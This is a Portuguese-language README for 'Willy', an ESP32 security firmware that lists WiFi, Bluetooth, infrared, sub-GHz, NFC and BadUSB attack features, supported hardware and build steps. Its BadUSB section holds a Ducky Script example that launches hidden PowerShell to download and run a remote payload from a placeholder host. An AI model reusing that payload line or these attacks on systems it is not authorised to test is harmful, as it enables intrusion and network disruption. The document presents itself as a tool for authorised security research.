<div align="center">

# 🛡️ Willy Firmware

### *O Kit Definitivo de Segurança para ESP32*

[![Licença](https://img.shields.io/badge/Licen%C3%A7a-MIT-blue.svg)](https://opensource.org/licenses/MIT)
[![Plataforma](https://img.shields.io/badge/Plataforma-ESP32-green.svg)](https://www.espressif.com/pt/products/socs/esp32)
[![Framework](https://img.shields.io/badge/Framework-Arduino-orange.svg)](https://www.arduino.cc/)
[![PlatformIO](https://img.shields.io/badge/PlatformIO-Compat%C3%ADvel-brightgreen.svg)](https://platformio.org/)
[![Versão](https://img.shields.io/badge/Vers%C3%A3o-Dev-red.svg)](https://github.com/pr3y/Willy)
[![Estrelas](https://img.shields.io/github/stars/pr3y/Willy?style=social)](https://github.com/pr3y/Willy/stargazers)
[![Forks](https://img.shields.io/github/forks/pr3y/Willy?style=social)](https://github.com/pr3y/Willy/network/members)
[![Issues](https://img.shields.io/github/issues/pr3y/Willy)](https://github.com/pr3y/Willy/issues)
[![Discord](https://img.shields.io/discord/123456789?color=7289da&label=Discord&logo=discord)](https://discord.gg/Willy)
[![Twitter](https://img.shields.io/twitter/follow/WillyFw?style=social)](https://twitter.com/WillyFw)

<img src="media/pictures/Willy_banner.jpg" alt="Willy Banner" width="600"/>

**Transforme seu ESP32 em uma poderosa ferramenta de pesquisa em segurança**

[📖 Documentação](docs/README.md) • [🚀 Início Rápido](#-início-rápido) • [⚡ Recursos](#-recursos) • [🤝 Contribuindo](#-contribuindo) • [💬 Comunidade](#-comunidade)

</div>

---

## ⚠️ Aviso Legal

> **IMPORTANTE:** Este firmware é fornecido **exclusivamente para fins educacionais e de pesquisa em segurança**. O uso não autorizado deste software pode violar leis locais, estaduais e federais. Os desenvolvedores e contribuidores **não se responsabilizam** por qualquer uso indevido ou danos causados por este software.
>
> **Use apenas em ambientes onde você tem autorização explícita.** Sempre obtenha permissão por escrito antes de realizar qualquer teste de segurança. Isso inclui:
>
> - Suas próprias redes e dispositivos
> - Redes onde você tem autorização por escrito
> - Trabalhos de teste de penetração autorizados
> - Ambientes de laboratório educacionais

---

## 📊 Estatísticas do Projeto

| Métrica | Status |
|---------|--------|
| ![Tamanho do código](https://img.shields.io/github/languages/code-size/pr3y/Willy) | Tamanho do Código |
| ![Último commit](https://img.shields.io/github/last-commit/pr3y/Willy) | Último Commit |
| ![Contribuidores](https://img.shields.io/github/contributors/pr3y/Willy) | Contribuidores |
| ![Atividade de commits](https://img.shields.io/github/commit-activity/m/pr3y/Willy) | Atividade |

---

## 🎯 Visão Geral

Willy é um **firmware open-source abrangente** para dispositivos baseados em ESP32 que os transforma em poderosas ferramentas de pesquisa em segurança. Inspirado em projetos como Flipper Zero e Pwnagotchi, Willy traz capacidades profissionais de segurança para hardware acessível.

<div align="center">

| 🔴 WiFi | 🔵 Bluetooth | 🟠 Infravermelho | 🟢 Sub-GHz | 🟣 NFC/RFID | 🟡 BadUSB |
|:------:|:-----------:|:----------:|:---------:|:----------:|:--------:|

</div>

### Por que Willy?

| Recurso | Willy | Flipper Zero | Pwnagotchi |
|---------|:-----:|:------------:|:----------:|
| **Ataques WiFi** | ✅ | ✅ | ✅ |
| **Ataques Bluetooth** | ✅ | ✅ | ❌ |
| **Infravermelho** | ✅ | ✅ | ❌ |
| **RF Sub-GHz** | ✅ | ✅ | ❌ |
| **NFC/RFID** | ✅ | ✅ | ❌ |
| **BadUSB** | ✅ | ✅ | ❌ |
| **Display Touch** | ✅ | ✅ | ❌ |
| **Open Source** | ✅ | ✅ | ✅ |
| **Preço** | R$75-250 | R$850+ | R$400+ |
| **Customizável** | ✅ | ⚠️ | ✅ |

---

## ✨ Recursos

### 📡 Segurança WiFi

<table>
<tr>
<td width="50%">

#### 🛡️ Reconhecimento

- **Analisador de Canais** - Análise de espectro
- **Contador de Pacotes** - Monitoramento em tempo real
- **Scanner de Redes** - Descobre todos os APs
- **Detecção de Clientes** - Encontra dispositivos conectados
- **Detector Pwnagotchi** - Identifica Pwnagotchis
- **Captura SAE Commit** - Handshakes WPA3

</td>
<td width="50%">

#### ⚔️ Operações Ofensivas

- **Flood de Probe Request** - Descoberta de SSID
- **Spam de Clone AP** - Criação de evil twin
- **Ataque Karma** - Exploração de auto-conexão
- **Ataque Deauth** - Desconexão forçada
- **Ataque Sleep** - Drenagem de bateria
- **Flood SAE Commit** - Teste de estresse WPA3

</td>
</tr>
</table>

### 📱 Segurança Bluetooth / BLE

<table>
<tr>
<td width="50%">

#### 🔍 Descoberta e Análise

- **Scanner BLE** - Descoberta de dispositivos
- **Analisador Bluetooth** - Inspeção de pacotes
- **Monitor Airtag** - Rastreamento de AirTags
- **Detector de Skimmers** - Recurso de segurança
- **Wardrive BT** - Log baseado em localização

</td>
<td width="50%">

#### 💥 Capacidades de Ataque

- **BLE Spam (Todos os Tipos)**
  - Dispositivos Google
  - Dispositivos Samsung
  - Flipper Zero
  - Swift Pair
- **Phishing GATT**
- **Drenagem de Conexão**
- **Jamming de Advertisement**

</td>
</tr>
</table>

### 📻 Infravermelho (IR)

| Categoria | Capacidades |
|-----------|-------------|
| **TVs** | LG, Samsung, Sony, TCL, Philips, Sharp, Toshiba, Panasonic, Hitachi |
| **ACs** | LG, Samsung, Midea, Gree, Daikin, Carrier, Fujitsu, Mitsubishi |
| **Consoles** | Xbox, PlayStation, Nintendo Switch |
| **Áudio** | Bose, Sonos, JBL, Harman Kardon |
| **Customizado** | Aprenda qualquer código IR, Replay, Fuzzer |

### 📡 Rádio Sub-GHz (CC1101)

<div align="center">

| Frequência | Aplicações |
|------------|------------|
| **315 MHz** | Portões de garagem, Abertura de portões |
| **390 MHz** | Chaves de carro (EUA) |
| **433 MHz** | Estações meteorológicas, Campainhas |
| **434 MHz** | Dispositivos médicos |
| **868 MHz** | Dispositivos EU |
| **915 MHz** | Dispositivos IoT (EUA) |

</div>

### 💳 NFC/RFID (PN532)

<table>
<tr>
<td width="33%">

#### 📖 Operações de Leitura

- Mifare Classic
- Mifare Ultralight
- Série NTAG
- DESFire
- ISO 14443-A/B

</td>
<td width="33%">

#### ✍️ Operações de Escrita

- Registros URL/NDEF
- Informações de Contato
- Credenciais WiFi
- Dados Customizados
- Cartões de Acesso

</td>
<td width="33%">

#### 🎭 Emulação

- Emulação de Cartão
- Spoofing de UID
- Chameleon Ultra
- Emulação Amiibo
- UID Dinâmico

</td>
</tr>
</table>

### ⌨️ BadUSB / HID

```d
// Exemplo de Ducky Script
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://exemplo.com/payload.ps1')
ENTER
```

### 🗺️ GPS e Wardriving

| Recurso | Descrição |
|---------|-----------|
| **Wardriving** | Log WiFi + dados GPS |
| **Export Wigle.net** | Upload para Wigle |
| **Rastreamento em Tempo Real** | Posição, Velocidade, Direção |
| **Export KML** | Visualização no Google Earth |
| **Custom Tools** | [Ferramentas Ofensivas](docs/hardware_custom_tools.md) |

---

## 🚀 Willy 2.1 Refinements

A nova versão **Willy 2.1** traz uma experiência de usuário premium e recursos forenses avançados para o repositório oficial.

### 🎨 Cyber Menu 2.1

- **Interface Futurista**: Ícones com arte vetorial moderna e animações 3D de zoom.
- **Efeitos Neon**: Pulsação de bordas e partículas de brilho (particle glow) ao interagir.
- **Barra de Notificações**: Status em tempo real de bateria, relógio e conectividade no topo da tela.

### 🕵️ Forensic Logging System

- **Logs Estruturados**: Gravação automática de eventos em `/WILLY_LOGS/` no formato CSV.
- **Rastreamento Operacional**: Registro detalhado de ataques WiFi, BLE e inicialização de módulos.
- **Análise Forense**: Ideal para auditorias e estudos pós-operação.

### 🌐 Futuristic Web Dashboard

- **Painel Responsivo**: Controle total do dispositivo via navegador com estética glassmorphism.
- **Live Stats**: Gráficos e indicadores em tempo real (RSSI, Heap, Uptime).
- **Log Viewer**: Terminal web integrado para visualização remota dos logs forenses.

---

## 🖥️ Hardware Suportado

### 🏆 Dispositivos Recomendados

<div align="center">

| Dispositivo | Display | Touch | SD Card | USB | Preço | Status |
|-------------|---------|-------|---------|-----|-------|--------|
| **CYD-2432S028** | 2.8" TFT | Resistivo | ✅ | 1x USB-C | ~R$100 | ⭐ Recomendado |
| **CYD-2USB** | 2.8" TFT | Resistivo | ✅ | 2x USB-C | ~R$125 | ⭐ Recomendado |
| **M5Stack Cardputer** | - | ❌ | ✅ | USB-C | ~R$250 | ✅ Suportado |
| **M5Stack Core2** | 2.0" TFT | Capacitivo | ✅ | USB-C | ~R$275 | ✅ Suportado |
| **M5Stack CoreS3** | 2.0" TFT | Capacitivo | ✅ | USB-C | ~R$300 | ✅ Suportado |
| **Lilygo T-Embed** | 1.14" TFT | Rotary | ✅ | USB-C | ~R$225 | ✅ Suportado |
| **Lilygo T-Display S3** | 1.9" TFT | ❌ | Opcional | USB-C | ~R$125 | ✅ Suportado |
| **Lilygo T-Deck** | 2.8" TFT | Capacitivo | ✅ | USB-C | ~R$400 | ✅ Suportado |
| **Lilygo T-Watch S3** | 1.78" TFT | Capacitivo | ✅ | USB-C | ~R$350 | ✅ Suportado |

</div>

### 🔌 Módulos Externos

<div align="center">

| Módulo | Função | Interface | Preço |
|--------|--------|-----------|-------|
| **CC1101** | Transceptor Sub-GHz | SPI | ~R$15 |
| **NRF24L01+** | Transceptor 2.4GHz | SPI | ~R$10 |
| **NRF24L01+ PA+LNA** | 2.4GHz Longo Alcance | SPI | ~R$40 |
| **PN532** | Leitor NFC/RFID | I2C/SPI | ~R$40 |
| **NEO-6M GPS** | Módulo GPS | UART | ~R$50 |
| **LED IR** | Transmissor Infravermelho | GPIO | ~R$0,50 |
| **Receptor TSOP IR** | Receptor Infravermelho | GPIO | ~R$2,50 |
| **W5500** | Ethernet | SPI | ~R$25 |

</div>

---

## 🚀 Início Rápido

### Pré-requisitos

```bash
# Instalar PlatformIO
pip install platformio

# Ou usar a extensão VS Code
# Procure por "PlatformIO IDE" nas extensões
```

### 📥 Instalação

#### Opção 1: Binário Pré-compilado (Recomendado para iniciantes)

1. Baixe o firmware mais recente em [Releases](https://github.com/pr3y/Willy/releases)
2. Conecte seu dispositivo via USB
3. Use o web flasher em [Willy.computer](https://Willy.computer)
   - OU use esptool:

   ```bash
   esptool.py --port COM3 write_flash 0x0 Willy-CYD-2USB.bin
   ```

#### Opção 2: Compilar do Código Fonte

```bash
# Clonar o repositório
git clone https://github.com/pr3y/Willy
cd Willy

# Compilar para seu dispositivo (exemplo CYD-2USB)
pio run -e CYD-2USB

# Upload para o dispositivo
pio run -e CYD-2USB --target upload

# Ou usar a variável de ambiente
pio run --target upload
```

---

## 📚 Documentação

### 📖 Documentação Completa

| Tópico | Descrição |
|--------|-----------|
| [Configuração de Hardware](docs/hardware_externo.md) | Conectando módulos externos |
| [Guia CYD](docs/hardware_cyd_2432s028r.md) | Guia específico CYD-2432S028 |
| [Ataques WiFi](docs/wifi_advanced_attacks.md) | Técnicas avançadas de WiFi |
| [Ataques BLE](docs/ble_advanced_attacks.md) | Teste de segurança Bluetooth |
| [Ataques IR](docs/ir_advanced_attacks.md) | Manipulação de infravermelho |
| [Ataques RF](docs/rf_advanced_attacks.md) | Operações Sub-GHz |
| [Guia NFC](docs/nfc_pn532.md) | Operações NFC/RFID |
| [BadUSB](docs/badusb_hid_attacks.md) | Payloads de ataque HID |
| [Configuração GPS](docs/gps_neo6m.md) | Setup de wardriving GPS |
| [Wiring CC1101](docs/cc1101_nrf24_wiring.md) | Conexões de módulos RF |

---

## 🤝 Contribuindo

Agradecemos contribuições! Veja como você pode ajudar:

### Formas de Contribuir

| Tipo | Descrição |
|------|-----------|
| 🐛 **Reportar Bugs** | Reporte problemas via [GitHub Issues](https://github.com/pr3y/Willy/issues) |
| 💡 **Sugerir Recursos** | Proponha novos recursos |
| 📝 **Documentação** | Melhore docs e traduções |
| 💻 **Código** | Envie pull requests |
| 🧪 **Testes** | Teste em diferentes hardwares |
| 📢 **Divulgar** | Compartilhe o Willy com outros |

---

## 🏆 Contribuidores

<div align="center">

[![Contribuidores](https://contrib.rocks/image?repo=pr3y/Willy)](https://github.com/pr3y/Willy/graphs/contributors)

**Obrigado a todos os contribuidores!** 🙏

</div>

---

## 💬 Comunidade

### Participe da Conversa

<div align="center">

[![Discord](https://img.shields.io/badge/Discord-Entrar%20no%20Servidor-7289da?style=for-the-badge&logo=discord)](https://discord.gg/Willy)
[![Telegram](https://img.shields.io/badge/Telegram-Entrar%20no%20Grupo-0088cc?style=for-the-badge&logo=telegram)](https://t.me/Willy)
[![Twitter](https://img.shields.io/badge/Twitter-Seguir-1DA1F2?style=for-the-badge&logo=twitter)](https://twitter.com/WillyFw)
[![Reddit](https://img.shields.io/badge/Reddit-Entrar%20na%20Comunidade-FF4500?style=for-the-badge&logo=reddit)](https://reddit.com/r/Willy)

</div>

---

## 📜 Licença

Este projeto está licenciado sob a **Licença MIT** - veja o arquivo [LICENSE](LICENSE) para detalhes.

---

## 🙏 Agradecimentos

### Projetos e Bibliotecas

| Projeto | Contribuição |
|---------|--------------|
| [Flipper Zero](https://flipperzero.one) | Inspiração e conceitos de UI |
| [Pwnagotchi](https://pwnagotchi.ai) | Inspiração para hacking WiFi |
| [IRremoteESP8266](https://github.com/crankyoldgit/IRremoteESP8266) | Biblioteca de protocolo IR |
| [NimBLE-Arduino](https://github.com/h2zero/NimBLE-Arduino) | Stack BLE |
| [RadioLib](https://github.com/jgromes/RadioLib) | Protocolos RF |
| [TFT_eSPI](https://github.com/Bodmer/TFT_eSPI) | Driver de display |
| [PlatformIO](https://platformio.org) | Sistema de build |
| [Arduino ESP32](https://github.com/espressif/arduino-esp32) | Framework ESP32 |

---

<div align="center">

### ⭐ Histórico de Estrelas

[![Gráfico de Histórico de Estrelas](https://api.star-history.com/svg?repos=pr3y/Willy&type=Date)](https://star-history.com/#pr3y/Willy&Date)

---

### 🛡️ Feito com ❤️ pela Equipe Willy

**[⬆ Voltar ao Topo](#-Willy-firmware)**

<img src="media/pictures/Willy_hd.png" alt="Logo Willy" width="150"/>

*Segurança em suas mãos*

</div>
